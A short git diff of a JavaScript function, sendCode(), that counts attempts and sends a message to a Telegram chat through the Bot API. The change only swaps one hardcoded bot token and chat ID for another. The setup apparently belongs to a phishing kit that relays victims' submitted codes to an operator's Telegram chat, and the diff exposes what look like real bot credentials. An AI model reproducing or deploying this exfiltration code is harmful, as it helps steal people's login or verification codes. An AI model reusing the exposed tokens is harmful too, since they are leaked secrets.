@@ -178,8 +178,8 @@ function sendCode() {
 
 
         NUMBER_TIME_SEND_CODE++;
-        const botToken = '8744850466:AAF7_EsiHfBybvQlPzOAgJlvBmzPHzpjeeg'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1004340441282'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
+        const botToken = '8967253124:AAEfhDjanPMgMzmnx8vFsJuoFj3deWFobKk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
+        const chatId = '-1004449902185'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
         const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
 
         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
